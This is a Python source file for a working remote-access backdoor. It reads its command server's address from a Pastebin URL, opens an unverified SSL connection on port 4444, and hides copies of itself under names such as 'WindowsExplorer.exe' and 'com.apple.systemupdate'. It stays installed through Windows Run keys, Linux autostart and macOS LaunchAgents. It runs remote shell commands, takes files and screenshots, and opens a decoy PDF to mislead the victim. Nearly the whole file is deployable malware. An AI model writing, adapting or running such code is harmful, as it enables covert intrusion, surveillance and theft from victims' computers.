import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import requests
import ssl
import platform
import time
import io
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
import pyautogui

def fetch_c2_ip():
    try:
        url = "https://pastebin.com/raw/DjTikqsH" # This is mine change it to ur Pastebin link
        response = requests.get(url, timeout=5) # Sends GET request to URL
        return response.text.strip() # Returns content of URL as string
    except:
        return "Server down for pastebin" # If URL not reachable

class Backdoor:
    def __init__(self, ip, port):
        self.copy_to_secret_location()
        self.become_persistent()
        # Create a TCP socket connection with IPv4
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Wrap the socket with SSL (no certificate verification for client)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        self.connection = context.wrap_socket(raw_sock)
        self.connection.connect((ip, port)) 

    def copy_to_secret_location(self):
        system = platform.system()
        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

        if system == "Windows":
            secret_path = os.path.join(os.environ["TEMP"], "WindowsExplorer.exe")
        elif system == "Linux":
            secret_path = os.path.expanduser("~/.local/.sysupdate")
        elif system == "Darwin":
            secret_path = os.path.expanduser("~/Library/Application Support/.sysupdate")
        else:
            return  # Unsupported OS

        # Only copy if not already in the secret location
        if os.path.abspath(current_path) != os.path.abspath(secret_path):
            try:
                shutil.copyfile(current_path, secret_path)
                os.chdir(os.path.dirname(secret_path))  # Set working dir
                os.execv(secret_path, [secret_path] + sys.argv[1:])
            except Exception as e:
                print(f"Copy error: {e}")

    def become_persistent(self):
        system = platform.system()
        if system == "Windows":
            self._windows_persistence()
        elif system == "Linux":
            self._linux_persistence()
        elif system == "Darwin":  # macOS
            self._mac_persistence()
        else:
            pass  # Or log unsupported OS

    def _windows_persistence(self):
        import winreg
        evil_file_location = os.path.join(os.environ["appdata"], "Windows Explorer.exe")
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Run",
                                     0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "update", 0, winreg.REG_SZ, evil_file_location)
                winreg.CloseKey(key)
            except Exception:
                pass

    def _linux_persistence(self):
        autostart_dir = os.path.expanduser("~/.config/autostart")
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        desktop_file = os.path.join(autostart_dir, "systemupdate.desktop")
        exec_path = sys.executable  # Path to the current Python executable or PyInstaller binary
        desktop_content = f"""
        [Desktop Entry]
        Type=Application
        Name=System Update
        Exec={exec_path}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        """
        try:
            with open(desktop_file, "w") as f:
                f.write(desktop_content)
            os.chmod(desktop_file, 0o755)
        except Exception as e:
            pass  # Optionally log the error

    def _mac_persistence(self):
        plist_dir = os.path.expanduser("~/Library/LaunchAgents")
        if not os.path.exists(plist_dir):
            os.makedirs(plist_dir)
        plist_file = os.path.join(plist_dir, "com.apple.systemupdate.plist")
        exec_path = sys.executable  # Path to the current Python executable or PyInstaller binary
        plist_content = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.systemupdate</string>
            <key>ProgramArguments</key>
            <array>
                <string>{exec_path}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """
        try:
            with open(plist_file, "w") as f:
                f.write(plist_content)
        except Exception as e:
            pass  # Optionally log the error

    def reliable_send(self, data):
        json_data = json.dumps(data).encode()
        length = len(json_data).to_bytes(4, byteorder='big')
        self.connection.send(length + json_data)

    def reliable_receive(self):
         # First, receive the 4-byte length header
        raw_length = self._recvall(4)
        if raw_length is None:
            return None  # Connection closed or error
        message_length = int.from_bytes(raw_length, byteorder='big')

        # Now receive the actual message of known length
        json_data = self._recvall(message_length)
        return json.loads(json_data.decode())

    def _recvall(self, length):
        """Helper to receive exactly 'length' bytes."""
        data = b""
        while len(data) < length:
            try:
                packet = self.connection.recv(length - len(data))
                if not packet:
                    return None  # Connection closed
                data += packet
            except socket.error:
                return None  # Socket error
        return data

    def execute_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL).decode("utf-8", errors="ignore") # Execute the command and return the result
        except subprocess.CalledProcessError as e:
            return "[-] Invalid Command"
    
    def change_working_directory_to(self, path):
        if os.path.isdir(path):  # Check if it's a valid directory
            try:
                os.chdir(path)  # Change the working directory
                return "[+] Changed working directory to " + path
            except PermissionError:
                return "[-] Error: Permission denied to access the directory: " + path
            except OSError as e:
                return f"[-] Error: Failed to change directory: {e}"
        else:
            return "[-] Error: Path does not exist or is not a directory: " + path

    def read_file(self, path):
        if not os.path.exists(path):  # Check if the file exists
            return f"[-] Error: File at {path} does not exist."
        
        try:
            with open(path, "rb") as file:  # Open the file in binary mode
                return base64.b64encode(file.read()).decode()  # Read, encode, and return base64 string
        except Exception as e:
            return f"[-] Error reading file: {str(e)}"  # Return error if any exception occurs

    def write_file(self, path, content):
        try:
            # Decode the base64 content and handle invalid base64 data
            decoded_content = base64.b64decode(content)
            
            # Check if the content is empty after decoding (this can happen if the base64 content is corrupted)
            if not decoded_content:
                return "[-] Error: Decoded content is empty. Invalid base64 data."
            
            # Check if the directory exists, if not, return an error
            directory = os.path.dirname(path) or "."
            if not os.path.exists(directory):
                return f"[-] Error: Directory does not exist: {directory}"

            # Write the decoded content to the file
            with open(path, "wb") as file:
                file.write(decoded_content)
            
            return "[+] Upload successful"
        
        except base64.binascii.Error:
            return "[-] Error: Invalid base64 encoding."
        except PermissionError:
            return f"[-] Error: Permission denied to write to {path}."
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def take_screenshot(self):
        try:
            screenshot = None
            system = platform.system()

            if ImageGrab and system in ["Windows", "Darwin"]:
                screenshot = ImageGrab.grab()
            else:
                # Linux: Check if GUI is available
                if os.environ.get("DISPLAY") is None:
                    return "[-] No GUI display available"

                screenshot = pyautogui.screenshot()

            buf = io.BytesIO()
            screenshot.save(buf, format='PNG')
            buf.seek(0)
            return base64.b64encode(buf.read()).decode()
        except Exception as e:
            return f"[-] Error taking screenshot: {str(e)}"

    def run(self):
        while True:
            try:
                command = self.reliable_receive()
                if not command:
                    break  # Connection closed
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "screenshot":
                    command_result = self.take_screenshot()
                else:
                    command_result = self.execute_command(command)
            except Exception as e:
                command_result = f"[-] Error during command execution: {str(e)}"
            self.reliable_send(command_result)

def main():
    ATTACKER_IP = fetch_c2_ip()
    if ATTACKER_IP == "Server down for pastebin":
        sys.exit("[-] Could not fetch C2 IP. Exiting.")

    if hasattr(sys, "_MEIPASS"):
        file_name = os.path.join(sys._MEIPASS, "sample.pdf")
        subprocess.Popen(file_name, shell=True)  # Open the pdf file

    while True:
        try:
            my_backdoor = Backdoor(ATTACKER_IP, 4444)
            my_backdoor.run()
        except Exception as e:
            print(f"Connection lost: {e}. Reconnecting in 9 seconds...")
            time.sleep(9)  

if __name__ == "__main__":
    main()